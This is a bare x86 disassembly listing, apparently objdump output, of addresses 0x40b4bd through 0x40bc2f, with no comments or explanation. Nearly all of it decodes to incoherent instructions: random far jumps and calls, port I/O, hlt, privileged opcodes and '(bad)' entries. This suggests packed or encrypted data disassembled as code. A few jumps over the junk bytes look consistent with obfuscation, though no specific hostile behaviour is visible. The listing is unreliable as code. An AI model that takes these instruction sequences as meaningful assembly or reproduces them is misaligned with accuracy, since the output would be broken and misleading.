  40b4bd:	inc    esp
  40b4be:	nop    ecx
  40b4c1:	jmp    0xf2c4:0xe7bd40d1
  40b4c8:	lock fisub WORD PTR [esi-0x3e755ff6]
  40b4cf:	xchg   edi,eax
  40b4d0:	mov    bh,0x6d
  40b4d2:	mov    ch,0xeb
  40b4d4:	or     ebp,DWORD PTR [edx-0x23]
  40b4d7:	mov    eax,edx
  40b4d9:	hlt    
  40b4da:	cwde   
  40b4db:	pop    ebp
  40b4dc:	pushf  
  40b4dd:	sbb    al,0xf3
  40b4df:	xchg   ebp,eax
  40b4e0:	neg    BYTE PTR [ecx+0x31fc2cfb]
  40b4e6:	sti    
  40b4e7:	mov    ecx,0x72a2737e
  40b4ec:	sbb    eax,0xcdccdece
  40b4f1:	pop    eax
  40b4f2:	test   BYTE PTR [esi-0x5e],0x15
  40b4f6:	clc    
  40b4f7:	sub    al,0x3d
  40b4f9:	or     ebp,DWORD PTR [ebx-0x10]
  40b4fc:	xor    BYTE PTR [esp+ecx*8-0x5f],cl
  40b500:	fsubr  st(3),st
  40b502:	and    dl,BYTE PTR [eax]
  40b504:	fist   WORD PTR [ecx]
  40b506:	adc    eax,0x9c320bed
  40b50b:	or     DWORD PTR [ebp+edi*1+0x67aa1da8],esi
  40b512:	or     eax,0xc280b6d5
  40b517:	test   BYTE PTR [eax+0x5ff52d76],ah
  40b51d:	test   DWORD PTR [edi-0x61452d8c],0x5c952532
  40b527:	lock and ebx,esi
  40b52a:	mov    al,ds:0xc45f860
  40b52f:	xchg   edx,eax
  40b530:	out    dx,al
  40b531:	dec    eax
  40b532:	xchg   ebx,eax
  40b533:	cwde   
  40b534:	xor    eax,0xbb5dec14
  40b539:	xor    ah,dl
  40b53b:	jmp    0x2076:0x7c7f8127
  40b542:	fmul   st(5),st
  40b544:	adc    al,0xf8
  40b546:	int3   
  40b547:	mov    ch,0x8f
  40b549:	mov    DWORD PTR [eax-0x11],edi
  40b54c:	push   cs
  40b54d:	std    
  40b54e:	inc    ecx
  40b54f:	fisub  DWORD PTR [esi-0x65]
  40b552:	gs repnz xchg edi,eax
  40b555:	xchg   esi,eax
  40b556:	or     ch,al
  40b558:	fadd   QWORD PTR [esi]
  40b55a:	in     eax,0x30
  40b55c:	xor    al,0xf9
  40b55e:	popa   
  40b55f:	popf   
  40b560:	xor    al,0xe5
  40b562:	pop    eax
  40b563:	popf   
  40b564:	dec    ebx
  40b565:	rcr    BYTE PTR [eax-0x73],cl
  40b568:	sub    edx,DWORD PTR [edi+0x4d971fe5]
  40b56e:	cmp    bh,dh
  40b570:	mov    dh,0x31
  40b572:	fisttp WORD PTR [ecx]
  40b574:	(bad)
  40b577:	fs pop esi
  40b579:	mov    esi,0x38ddd539
  40b57e:	adc    dl,BYTE PTR ds:0xaf9284db
  40b584:	jp     0x40b5a4
  40b586:	and    DWORD PTR [esi+0x1b],esp
  40b589:	ds jnp 0x40b5be
  40b58c:	push   esp
  40b58d:	fidiv  DWORD PTR [edx+0x20c8ed2]
  40b593:	inc    edi
  40b594:	cmp    DWORD PTR [ecx],ecx
  40b596:	cli    
  40b597:	and    dl,al
  40b599:	xchg   esp,eax
  40b59a:	iret   
  40b59b:	push   ecx
  40b59c:	aad    0x98
  40b59e:	cmp    al,BYTE PTR [edx-0x5b]
  40b5a1:	retf   0x496a
  40b5a4:	adc    ch,dh
  40b5a6:	xchg   cl,ch
  40b5a8:	je     0x40b615
  40b5aa:	ret    
  40b5ab:	mov    cl,0x6f
  40b5ad:	popf   
  40b5ae:	int    0x96
  40b5b0:	sub    edi,0xffffff80
  40b5b3:	mov    ?,esp
  40b5b5:	sub    al,0xfc
  40b5b8:	addr16 jns 0x40b5cb
  40b5bb:	inc    ebx
  40b5bc:	or     eax,0xd3717cfc
  40b5c1:	or     DWORD PTR [ebp-0x70],eax
  40b5c4:	fisttp QWORD PTR ds:0xc23459d4
  40b5ca:	imul   eax,DWORD PTR [edx+0xe],0xffffff92
  40b5ce:	mov    ah,0xab
  40b5d0:	(bad)  
  40b5d1:	ficom  DWORD PTR [eax-0x1c9eee43]
  40b5d7:	or     al,0xb0
  40b5d9:	imul   ebx,DWORD PTR [esi],0xfc78af7f
  40b5df:	mov    BYTE PTR [ecx],dh
  40b5e1:	dec    ebp
  40b5e2:	and    ebp,DWORD PTR gs:[ecx+ebp*4+0x1]
  40b5e7:	sub    BYTE PTR ds:0x38ebe092,ah
  40b5ed:	loopne 0x40b5ad
  40b5ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f0:	lods   al,BYTE PTR ds:[esi]
  40b5f1:	inc    edx
  40b5f2:	lds    ecx,FWORD PTR [ecx+edx*1]
  40b5f5:	adc    al,0xd8
  40b5f7:	xchg   esp,eax
  40b5f8:	and    al,0x25
  40b5fa:	fild   WORD PTR [ebp-0x69]
  40b5fd:	pop    esi
  40b5fe:	dec    ebx
  40b5ff:	mov    ch,0x46
  40b601:	in     eax,0xa3
  40b603:	add    al,0x8b
  40b605:	inc    ebp
  40b606:	lock mov DWORD PTR [ebp-0x10],eax
  40b60a:	mov    eax,DWORD PTR [ebp-0x1c]
  40b60d:	jmp    0x40bb18
  40b612:	vpsrld xmm2,xmm7,xmm6
  40b616:	fcmovbe st,st(5)
  40b618:	leave  
  40b619:	sar    DWORD PTR [ebx-0x5],1
  40b61c:	cmp    al,0x28
  40b61e:	xchg   ecx,eax
  40b61f:	int3   
  40b620:	nop
  40b621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b622:	mov    eax,0x6a78789b
  40b627:	jl     0x40b6a1
  40b629:	js     0x40b637
  40b62b:	add    esi,DWORD PTR [ebp+0x435543a9]
  40b631:	xchg   edx,eax
  40b632:	call   0xd7082be0
  40b637:	test   al,0xa8
  40b639:	into   
  40b63a:	ret    0x15fe
  40b63d:	fadd   st,st(3)
  40b63f:	out    0x44,al
  40b641:	mov    eax,ds:0x93b5919c
  40b646:	cmc    
  40b647:	jns    0x40b643
  40b649:	loop   0x40b64d
  40b64b:	scas   eax,DWORD PTR es:[edi]
  40b64c:	mov    ch,0xde
  40b64e:	pop    ebp
  40b64f:	cmc    
  40b650:	dec    BYTE PTR [edx-0x54ee0e6f]
  40b656:	aam    0x41
  40b658:	mov    ds:0x3276f9d3,eax
  40b65d:	xchg   esi,eax
  40b65e:	sbb    al,0x6e
  40b660:	push   ss
  40b661:	xor    DWORD PTR [edi],eax
  40b663:	sbb    eax,DWORD PTR [esi-0x76d78772]
  40b669:	call   0xd4c2e93c
  40b66e:	retfw  
  40b670:	mov    bh,dh
  40b672:	mov    bh,0xb1
  40b674:	xchg   edi,eax
  40b675:	and    eax,0x28323e37
  40b67a:	dec    esp
  40b67b:	adc    dh,bl
  40b67d:	bnd je 0x40b6d5
  40b680:	out    0x2a,eax
  40b682:	je     0x40b6b9
  40b684:	pushf  
  40b685:	xchg   esp,eax
  40b686:	xchg   ebp,eax
  40b687:	ror    DWORD PTR [ebp+0x5dd65848],0x17
  40b68e:	inc    esi
  40b68f:	sub    cl,ah
  40b691:	mov    bh,0xe1
  40b693:	mov    bl,0xc4
  40b695:	xchg   ebx,eax
  40b696:	xlat   BYTE PTR ds:[ebx]
  40b697:	pop    eax
  40b698:	enter  0xd3cf,0x1c
  40b69c:	inc    esi
  40b69d:	jmp    0x40b654
  40b69f:	sub    DWORD PTR [ecx-0x71c4bdd2],edx
  40b6a5:	mov    edx,0xa29c9174
  40b6aa:	or     bl,BYTE PTR [eax+0x26084325]
  40b6b0:	scas   al,BYTE PTR es:[edi]
  40b6b1:	jle    0x40b6a1
  40b6b3:	ror    DWORD PTR [eax+0x72],0x8e
  40b6b7:	pop    esp
  40b6b8:	stc    
  40b6b9:	cmp    bl,al
  40b6bb:	push   ecx
  40b6bc:	mov    eax,ds:0xa83d5f81
  40b6c1:	xor    edx,DWORD PTR [eax]
  40b6c3:	daa    
  40b6c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6c5:	jge    0x40b661
  40b6c7:	jno    0x40b6c2
  40b6c9:	inc    esp
  40b6ca:	xchg   DWORD PTR [ecx+eax*4+0x78a135fb],ebp
  40b6d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6d2:	push   ds
  40b6d3:	into   
  40b6d4:	mov    eax,0x5a7aa19d
  40b6d9:	jne    0x40b682
  40b6db:	test   eax,0x71e8c9b4
  40b6e0:	fisttp DWORD PTR [edi-0x62]
  40b6e3:	retf   
  40b6e4:	repz retf 0x9f1b
  40b6e8:	xchg   ebp,esi
  40b6ea:	js     0x40b740
  40b6ec:	in     al,dx
  40b6ed:	xchg   esp,eax
  40b6ee:	and    BYTE PTR [edx+0x28],al
  40b6f1:	imul   edi,DWORD PTR [ecx-0x25],0xffffff85
  40b6f5:	sub    eax,0x30436a4e
  40b6fa:	add    ch,al
  40b6fc:	aas    
  40b6fd:	sbb    BYTE PTR [esi-0x2f],0xc9
  40b701:	mov    cl,0x88
  40b703:	out    0xba,eax
  40b705:	sub    BYTE PTR [edx],bl
  40b707:	mov    ds:0x75281134,eax
  40b70c:	push   cs
  40b70d:	inc    ebx
  40b70e:	or     DWORD PTR [eax],ebx
  40b710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b711:	pop    ecx
  40b712:	stc    
  40b713:	pop    ds
  40b714:	push   es
  40b715:	jno    0x40b6c5
  40b717:	pop    ss
  40b718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b719:	push   ecx
  40b71a:	or     eax,0xb2291e7d
  40b71f:	inc    ebp
  40b720:	pop    es
  40b721:	call   0x2e92:0x90f1694a
  40b728:	mov    eax,ebx
  40b72a:	call   0xddd9feba
  40b72f:	aas    
  40b730:	dec    edx
  40b731:	add    eax,0x89edd251
  40b736:	dec    eax
  40b737:	into   
  40b738:	mov    bl,0x63
  40b73a:	scas   eax,DWORD PTR es:[edi]
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	ret    0xe3b2
  40b73f:	mov    al,ds:0x5780ed9
  40b744:	mov    edi,DWORD PTR [eax]
  40b746:	push   esi
  40b747:	dec    esi
  40b748:	cmp    BYTE PTR [ecx+0x57],0x41
  40b74c:	adc    BYTE PTR [ecx-0x641fe82d],al
  40b752:	push   cs
  40b753:	add    eax,ebp
  40b755:	dec    esi
  40b756:	sub    DWORD PTR [eax],ebx
  40b758:	lds    edi,FWORD PTR [edx-0x34f378f4]
  40b75e:	out    dx,al
  40b75f:	mov    edi,0x44a02fd7
  40b764:	test   al,0x53
  40b766:	gs xchg ecx,eax
  40b768:	mov    al,ds:0x3fd47a89
  40b76d:	dec    edi
  40b76e:	(bad)  [edx-0x654bd1d1]
  40b774:	cmp    dh,BYTE PTR [edi+0x3]
  40b777:	xchg   esi,eax
  40b778:	in     al,0x67
  40b77a:	aam    0xcd
  40b77c:	into   
  40b77d:	scas   al,BYTE PTR es:[edi]
  40b77e:	mov    ecx,cs
  40b780:	inc    edi
  40b781:	and    dl,BYTE PTR [edx]
  40b783:	call   0x60f06c43
  40b788:	mov    ebx,0xce6e7a37
  40b78d:	lods   al,BYTE PTR ds:[esi]
  40b78e:	push   es
  40b78f:	push   ds
  40b790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b791:	loopne 0x40b73e
  40b793:	dec    ebp
  40b794:	icebp  
  40b795:	and    eax,0x2d052a0d
  40b79a:	push   cs
  40b79b:	cmp    eax,0x8fcc0efa
  40b7a0:	jnp    0x40b781
  40b7a2:	or     DWORD PTR [esi],ecx
  40b7a4:	clc    
  40b7a5:	ins    BYTE PTR es:[edi],dx
  40b7a6:	repz pushf 
  40b7a8:	loop   0x40b73d
  40b7aa:	enter  0x3a2,0xbe
  40b7ae:	fmulp  st(5),st
  40b7b0:	sti    
  40b7b1:	test   eax,0x7a862b9d
  40b7b6:	jno    0x40b786
  40b7b8:	dec    esp
  40b7b9:	xor    DWORD PTR [edi+0x6d9c4ff9],esp
  40b7bf:	sbb    dh,al
  40b7c1:	icebp  
  40b7c2:	inc    esi
  40b7c3:	add    dl,BYTE PTR [edi+0x71]
  40b7c6:	inc    eax
  40b7c7:	jne    0x40b76a
  40b7c9:	call   FWORD PTR [edi]
  40b7cb:	sti    
  40b7cc:	mov    ebp,0xf1c1e71b
  40b7d1:	aaa    
  40b7d2:	and    BYTE PTR [ebp-0x43],0x54
  40b7d6:	sbb    eax,0x52f22027
  40b7db:	retf   
  40b7dc:	stos   DWORD PTR es:[edi],eax
  40b7dd:	mov    ebx,0xee33a477
  40b7e2:	or     eax,0x948d463d
  40b7e7:	mov    BYTE PTR [ebx+0x2f2d6d69],dh
  40b7ed:	jmp    FWORD PTR [ebp+0x74bf7fe1]
  40b7f3:	leave  
  40b7f4:	sbb    ebx,DWORD PTR [esi-0x35825383]
  40b7fa:	outs   dx,DWORD PTR fs:[esi]
  40b7fc:	stc    
  40b7fd:	jae    0x40b826
  40b7ff:	iret   
  40b800:	(bad)  
  40b802:	mov    ah,0xbb
  40b804:	fldenv [ebp-0x20]
  40b807:	inc    eax
  40b808:	adc    DWORD PTR [edi+ecx*2-0x418ef61e],0xfcc10de
  40b813:	sub    DWORD PTR [ebx-0x1a5df29e],ecx
  40b819:	cld    
  40b81a:	mov    al,ds:0x4976b131
  40b81f:	jo     0x40b829
  40b821:	pop    esp
  40b822:	in     eax,0xd0
  40b824:	(bad)  
  40b825:	adc    esp,esp
  40b827:	or     al,0xfa
  40b829:	(bad)  
  40b82b:	mov    ecx,0xd4ccafb6
  40b830:	dec    ecx
  40b831:	lds    eax,FWORD PTR [eax+0x1aaadd38]
  40b837:	fwait
  40b838:	cli    
  40b839:	es jle 0x40b80b
  40b83c:	mov    bh,0xb8
  40b83e:	mov    ah,0x49
  40b840:	or     al,0x13
  40b842:	sbb    bh,BYTE PTR [edi-0x66]
  40b845:	or     BYTE PTR [ebx],cl
  40b847:	and    al,0x21
  40b849:	into   
  40b84a:	mov    bl,0xd8
  40b84c:	repnz int3 
  40b84e:	push   eax
  40b84f:	stc    
  40b850:	or     ebp,esi
  40b852:	scas   al,BYTE PTR es:[edi]
  40b853:	mov    bh,BYTE PTR [esi+0x3a]
  40b856:	out    dx,al
  40b857:	sub    BYTE PTR [esi],al
  40b859:	adc    BYTE PTR [edi-0x4940e95f],bh
  40b85f:	mov    BYTE PTR [ecx-0x47],cl
  40b862:	inc    ebp
  40b863:	dec    esp
  40b864:	sbb    edx,ebx
  40b866:	pushf  
  40b867:	call   0x58f7:0x2294fd79
  40b86e:	in     eax,dx
  40b86f:	mov    ch,0x52
  40b871:	sub    ebx,ebp
  40b873:	enter  0x933,0x3
  40b877:	dec    ecx
  40b878:	enter  0x610f,0xfa
  40b87c:	in     eax,dx
  40b87d:	test   BYTE PTR [esi-0x466fd9d6],ch
  40b883:	mov    ebp,0xe29c751a
  40b888:	enter  0x2924,0xf2
  40b88c:	cld    
  40b88d:	jns    0x40b87b
  40b88f:	(bad)  
  40b890:	dec    edi
  40b891:	jp     0x40b8d5
  40b893:	inc    ecx
  40b894:	dec    eax
  40b895:	ret    
  40b896:	jge    0x40b8dc
  40b898:	loope  0x40b8f0
  40b89a:	popa   
  40b89b:	jmp    0x40b892
  40b89d:	mov    bl,0x4c
  40b89f:	dec    esp
  40b8a0:	ret    0x70fa
  40b8a3:	push   0xffffffc3
  40b8a5:	(bad)  
  40b8a6:	loop   0x40b8c6
  40b8a8:	mov    dh,0x2f
  40b8aa:	add    al,dh
  40b8ac:	sbb    BYTE PTR [edi-0x7],0x15
  40b8b0:	sub    edx,DWORD PTR [ebx-0x69]
  40b8b3:	out    0xb2,al
  40b8b5:	push   0xb
  40b8b7:	add    al,0xe6
  40b8b9:	xor    ebx,DWORD PTR [edx+edx*2+0x31]
  40b8bd:	cmp    al,0x5d
  40b8bf:	fistp  QWORD PTR [edx+0x7281ab29]
  40b8c5:	push   ebp
  40b8c6:	icebp  
  40b8c7:	aas    
  40b8c8:	and    al,0x40
  40b8ca:	pop    es
  40b8cb:	daa    
  40b8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8cd:	iret   
  40b8ce:	hlt    
  40b8cf:	adc    dh,BYTE PTR [esi-0x42]
  40b8d2:	aas    
  40b8d3:	ror    eax,cl
  40b8d5:	adc    DWORD PTR [eax-0x25],ebx
  40b8d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8d9:	mov    dh,0x83
  40b8db:	sbb    ebp,DWORD PTR [ebp-0x77]
  40b8de:	mov    cl,0xa7
  40b8e0:	mov    ebx,0x4f56631f
  40b8e5:	lock inc ebx
  40b8e7:	jb     0x40b902
  40b8e9:	and    al,BYTE PTR [ebp+0x62637261]
  40b8ef:	jmp    0xd69a5184
  40b8f4:	cmp    al,0x74
  40b8f6:	mov    dh,0x2b
  40b8f8:	push   ds
  40b8f9:	js     0x40b88c
  40b8fb:	js     0x40b973
  40b8fd:	mov    ah,bh
  40b8ff:	mov    ch,0xda
  40b901:	(bad)  
  40b902:	leave  
  40b903:	sub    esi,esp
  40b905:	enter  0xc047,0x4a
  40b909:	imul   DWORD PTR [edi+ebp*8]
  40b90c:	mov    BYTE PTR [eax+0xa],al
  40b90f:	mov    edx,0xe0dbb5c9
  40b914:	pop    es
  40b915:	sbb    al,0xa
  40b917:	aaa    
  40b918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b919:	push   edi
  40b91a:	loope  0x40b8a9
  40b91c:	cs jl  0x40b93a
  40b91f:	inc    esi
  40b920:	out    dx,eax
  40b921:	shl    BYTE PTR [eax+0x53],1
  40b924:	mov    sp,0xafb2
  40b928:	stos   BYTE PTR es:[edi],al
  40b929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b92a:	gs adc esp,edi
  40b92d:	dec    ebp
  40b92e:	pop    ebp
  40b92f:	cmp    BYTE PTR [edi+0xa],0x42
  40b933:	sahf   
  40b934:	sbb    BYTE PTR [eax-0x46],0x69
  40b938:	push   eax
  40b939:	jno    0x40b975
  40b93b:	add    DWORD PTR [ebx-0x31a87339],edi
  40b941:	nop
  40b942:	mov    bl,0x89
  40b944:	arpl   WORD PTR [eax-0xa9ad58b],sp
  40b94a:	retf   
  40b94b:	push   ebx
  40b94c:	pop    ds
  40b94d:	ja     0x40b925
  40b94f:	jns    0x40b8e2
  40b951:	es add eax,0x2e46b001
  40b957:	and    bh,BYTE PTR [ecx]
  40b959:	outs   dx,DWORD PTR ds:[esi]
  40b95a:	add    eax,0x3055b5e7
  40b95f:	sub    ebx,esi
  40b961:	dec    ecx
  40b962:	pushf  
  40b963:	int3   
  40b964:	push   ds
  40b965:	mov    eax,fs
  40b967:	enter  0x1886,0xff
  40b96b:	dec    esi
  40b96c:	pushf  
  40b96d:	je     0x40b98d
  40b96f:	ror    BYTE PTR [eax+0x68c467ad],cl
  40b975:	jns    0x40b9ba
  40b977:	mov    ds,WORD PTR [eax+0x5abce2e9]
  40b97d:	jbe    0x40b9c1
  40b97f:	xor    esi,DWORD PTR [eax]
  40b981:	test   DWORD PTR [ebp+0xb],0x4c050da7
  40b988:	sbb    DWORD PTR [edi+0x27a480d1],0x5a
  40b98f:	or     al,0x9a
  40b991:	int3   
  40b992:	dec    dx
  40b994:	popa   
  40b995:	jne    0x40b9bf
  40b997:	and    DWORD PTR [eax+0x351cfa84],0xffffffec
  40b99e:	in     al,dx
  40b99f:	sbb    BYTE PTR [ecx+ebx*1-0x70e9d44a],ah
  40b9a6:	ret    0xacd7
  40b9a9:	inc    esi
  40b9aa:	jo     0x40b9b3
  40b9ac:	and    BYTE PTR [ebp+0x7d],bh
  40b9af:	icebp  
  40b9b0:	xor    DWORD PTR [ebx+eiz*1+0x4],0x0
  40b9b5:	daa    
  40b9b6:	sub    DWORD PTR [eax],ebp
  40b9b8:	stc    
  40b9b9:	jle    0x40ba1a
  40b9bb:	lock mov ebp,0xa9db4f8d
  40b9c1:	(bad)  
  40b9c2:	pop    esp
  40b9c3:	fnstsw WORD PTR [esi]
  40b9c5:	or     dh,bl
  40b9c7:	and    BYTE PTR [edi],0x63
  40b9ca:	std    
  40b9cb:	jmp    0xdec986ee
  40b9d0:	scas   eax,DWORD PTR es:[edi]
  40b9d1:	aad    0x4c
  40b9d3:	pusha  
  40b9d4:	outs   dx,DWORD PTR ds:[esi]
  40b9d5:	and    dl,BYTE PTR [edi-0x6aea100a]
  40b9db:	ret    
  40b9dc:	aad    0xb0
  40b9de:	cmp    BYTE PTR [edx-0x79],ch
  40b9e1:	mov    ebp,0x67a6d99a
  40b9e6:	jge    0x40b999
  40b9e8:	lock loopne 0x40ba19
  40b9eb:	ja     0x40ba34
  40b9ed:	fldcw  WORD PTR [ebx+0x3c43ad50]
  40b9f3:	mov    cl,BYTE PTR [ecx-0xcd71733]
  40b9f9:	rcl    BYTE PTR [ebp+0xabe06e7],cl
  40b9ff:	jb     0x40b9b9
  40ba01:	add    DWORD PTR [edi+ebx*8-0x6e],esp
  40ba05:	sbb    BYTE PTR [esi+0x27],bh
  40ba08:	push   ss
  40ba09:	int    0xe7
  40ba0b:	jae    0x40b995
  40ba0d:	mov    dh,0xb0
  40ba0f:	jp     0x40ba5f
  40ba11:	sub    DWORD PTR [edi],esp
  40ba13:	push   esi
  40ba14:	and    al,0xc7
  40ba16:	nop
  40ba17:	and    al,0xa6
  40ba19:	xor    edi,edx
  40ba1b:	frstor [ecx]
  40ba1d:	cmp    BYTE PTR [ecx-0x325a701e],dl
  40ba23:	pop    ss
  40ba24:	outs   dx,DWORD PTR ds:[esi]
  40ba25:	sub    ecx,0xffffffd0
  40ba28:	mov    ch,0xc1
  40ba2a:	inc    edx
  40ba2b:	add    al,0x38
  40ba2d:	jl     0x40ba8d
  40ba2f:	xchg   ebp,eax
  40ba30:	mov    bl,0x53
  40ba32:	mul    DWORD PTR [edi-0x33315768]
  40ba38:	outs   dx,BYTE PTR ds:[esi]
  40ba39:	test   eax,0x944bf604
  40ba3e:	int3   
  40ba3f:	dec    eax
  40ba40:	inc    esp
  40ba41:	aaa    
  40ba42:	in     eax,0xa4
  40ba44:	dec    ebx
  40ba45:	gs xor cl,ah
  40ba48:	sbb    eax,ebx
  40ba4a:	nop    DWORD PTR [eax]
  40ba4d:	sbb    ecx,DWORD PTR [esi]
  40ba4f:	stc    
  40ba50:	dec    esp
  40ba51:	inc    edx
  40ba52:	cdq    
  40ba53:	fwait
  40ba54:	adc    BYTE PTR [esi-0x71],al
  40ba57:	and    BYTE PTR [edx+0xcaad267],dh
  40ba5d:	xor    BYTE PTR [edx],0xb1
  40ba60:	loop   0x40b9ec
  40ba62:	loope  0x40bab5
  40ba64:	inc    esp
  40ba65:	mov    edi,0x5fdca2e4
  40ba6a:	dec    edi
  40ba6b:	jns    0x40bab8
  40ba6d:	frstor [ecx+0x44ce49d3]
  40ba73:	inc    ecx
  40ba74:	cmp    bl,BYTE PTR [edx-0x5b]
  40ba77:	cmp    esi,DWORD PTR [esp+eax*8-0x17]
  40ba7b:	pop    esp
  40ba7c:	xchg   esp,eax
  40ba7d:	add    dh,ch
  40ba7f:	jl     0x40ba94
  40ba81:	ret    
  40ba82:	pop    ecx
  40ba83:	add    edx,0x3a3ea298
  40ba89:	jecxz  0x40bae9
  40ba8b:	imul   esp,DWORD PTR [edx+0x0],0x25
  40ba8f:	add    eax,0x222c6f21
  40ba94:	sub    al,0x7f
  40ba96:	adc    ecx,DWORD PTR [ebp+0x77e4d179]
  40ba9c:	mov    ecx,0xe8e8f6d3
  40baa1:	sub    eax,ebx
  40baa3:	push   cs
  40baa4:	mov    ebx,0xf57ce207
  40baa9:	adc    al,0x9b
  40baab:	inc    ebx
  40baac:	fadd   DWORD PTR [eax]
  40baae:	aam    0xe4
  40bab0:	jl     0x40ba9d
  40bab2:	popf   
  40bab3:	(bad)
  40bab6:	ins    DWORD PTR es:[edi],dx
  40bab7:	jo     0x40ba98
  40bab9:	mov    edi,0x303eb555
  40babe:	cmc    
  40babf:	call   0x1b52:0x7be3f18e
  40bac6:	ja     0x40ba86
  40bac8:	in     eax,0xb1
  40baca:	and    cl,dh
  40bacc:	pop    ss
  40bacd:	and    DWORD PTR [ecx],0x61795fe0
  40bad3:	fmul   DWORD PTR [ebp+edx*1+0x5c]
  40bad7:	mov    edx,0x16f243ba
  40badc:	mov    cl,0xac
  40bade:	xor    eax,0xed5b2378
  40bae3:	push   ss
  40bae4:	aad    0xaf
  40bae6:	cmp    eax,0x2427115b
  40baeb:	push   0xcb19eb88
  40baf0:	out    0x7a,eax
  40baf2:	mov    ds:0xff19a1c5,al
  40baf7:	cli    
  40baf8:	addr16 je 0x40bae3
  40bafb:	cmp    eax,0x56f182bd
  40bb00:	mov    ah,0x75
  40bb02:	in     al,0xed
  40bb04:	std    
  40bb05:	aas    
  40bb06:	xchg   ebp,eax
  40bb07:	mov    eax,ds:0x8cf29823
  40bb0c:	mov    ah,0x84
  40bb0e:	hlt    
  40bb0f:	cmp    BYTE PTR [edx],ah
  40bb11:	stos   DWORD PTR es:[edi],eax
  40bb12:	mov    al,0x7c
  40bb14:	jno    0x40baf3
  40bb16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb17:	retf   
  40bb18:	mov    DWORD PTR [ebp-0x40],ebx
  40bb1b:	mov    DWORD PTR [ebp-0x2c],eax
  40bb1e:	mov    eax,DWORD PTR [ebp-0x40]
  40bb21:	jmp    0x40c02c
  40bb26:	ror    esp,1
  40bb28:	ror    ah,cl
  40bb2a:	rcl    edx,1
  40bb2c:	rcl    ecx,1
  40bb2e:	cld    
  40bb2f:	in     al,dx
  40bb30:	lock cmp eax,0x25f34c79
  40bb36:	stos   BYTE PTR es:[edi],al
  40bb37:	sahf   
  40bb38:	js     0x40bbb2
  40bb3a:	push   0x7c
  40bb3c:	js     0x40bbb6
  40bb3e:	outs   dx,BYTE PTR ds:[esi]
  40bb3f:	neg    DWORD PTR [eax]
  40bb41:	pop    eax
  40bb42:	fs repnz fldl2e 
  40bb46:	jne    0x40bb06
  40bb48:	sahf   
  40bb49:	psubsw mm3,QWORD PTR [ecx]
  40bb4c:	fidiv  WORD PTR [ebp-0x2b9175ae]
  40bb52:	add    bh,BYTE PTR [edi]
  40bb54:	pop    esi
  40bb55:	or     al,0xc9
  40bb57:	sbb    dh,BYTE PTR [edi+0x46]
  40bb5a:	and    cl,ah
  40bb5c:	sbb    BYTE PTR [ecx],0x84
  40bb5f:	xlat   BYTE PTR ds:[ebx]
  40bb60:	and    al,0xc9
  40bb62:	mov    ds:0x1f49882b,al
  40bb67:	xor    dl,bl
  40bb69:	pop    ss
  40bb6a:	and    DWORD PTR [edi-0x32e493ff],edx
  40bb70:	inc    esp
  40bb71:	inc    ebx
  40bb72:	push   cs
  40bb73:	outs   dx,DWORD PTR ds:[esi]
  40bb74:	adc    BYTE PTR [esi+0x34892f8e],ch
  40bb7a:	imul   esp,DWORD PTR es:[edi-0x1d584dc4],0x8e315db7
  40bb85:	and    edx,DWORD PTR [ebx+esi*4+0x7c23fd08]
  40bb8c:	jns    0x40bb8c
  40bb8e:	ret    
  40bb8f:	hlt    
  40bb90:	sub    DWORD PTR [ebx+0x2071a79d],esp
  40bb96:	add    eax,0x9caa6660
  40bb9b:	inc    edi
  40bb9c:	xchg   esp,eax
  40bb9d:	and    edx,DWORD PTR [edx+0x32615e55]
  40bba3:	push   ecx
  40bba4:	gs adc al,0x2e
  40bba7:	cmp    al,0x1e
  40bba9:	enter  0x7d00,0x61
  40bbad:	fcom   DWORD PTR [edx+0x18]
  40bbb0:	jne    0x40bbc2
  40bbb2:	push   ecx
  40bbb3:	push   ebx
  40bbb4:	fcomp  QWORD PTR [eax+0x2c]
  40bbb7:	ror    BYTE PTR [ebx+eax*1-0x77],0x6e
  40bbbc:	out    dx,al
  40bbbd:	mov    cl,0x52
  40bbbf:	sti    
  40bbc0:	stc    
  40bbc1:	mov    eax,ds:0x5e9767aa
  40bbc6:	ins    DWORD PTR es:[edi],dx
  40bbc7:	test   DWORD PTR [ebx],eax
  40bbc9:	xchg   esi,eax
  40bbca:	iret   
  40bbcb:	scas   eax,DWORD PTR es:[edi]
  40bbcc:	xor    DWORD PTR ds:0x5cbdbdb9,0xdc9ca8ee
  40bbd6:	or     ah,BYTE PTR [edx-0x1a3a2a42]
  40bbdc:	mov    bl,BYTE PTR [bp+si-0x603a]
  40bbe1:	loope  0x40bc37
  40bbe3:	test   BYTE PTR [edx-0x63],bl
  40bbe6:	call   0xc5b61702
  40bbeb:	(bad)  
  40bbec:	int3   
  40bbed:	fs push esi
  40bbef:	std    
  40bbf0:	jp     0x40bbd1
  40bbf2:	popf   
  40bbf3:	jne    0x40bbf0
  40bbf5:	adc    dh,bl
  40bbf7:	bound  ebx,QWORD PTR [esi-0x54377a2d]
  40bbfd:	mov    edx,0x8ee8b9af
  40bc02:	cmp    al,0xa9
  40bc04:	xchg   DWORD PTR [edx+0x66],esi
  40bc07:	sbb    ebp,DWORD PTR [eax+0x1c]
  40bc0a:	es ins BYTE PTR es:[edi],dx
  40bc0c:	jbe    0x40bc71
  40bc0e:	cmp    DWORD PTR [esi],esi
  40bc10:	mov    bh,0xd8
  40bc12:	mov    ebp,0x1d1a44f9
  40bc17:	pop    ss
  40bc18:	xor    edx,DWORD PTR [ebx+0x41]
  40bc1b:	jne    0x40bbe7
  40bc1d:	adc    eax,0x75eebe7a
  40bc22:	inc    esp
  40bc23:	ss icebp 
  40bc25:	mov    ah,0xe5
  40bc27:	sbb    DWORD PTR [eax],esi
  40bc29:	push   0x640cd384
  40bc2e:	popf   
  40bc2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
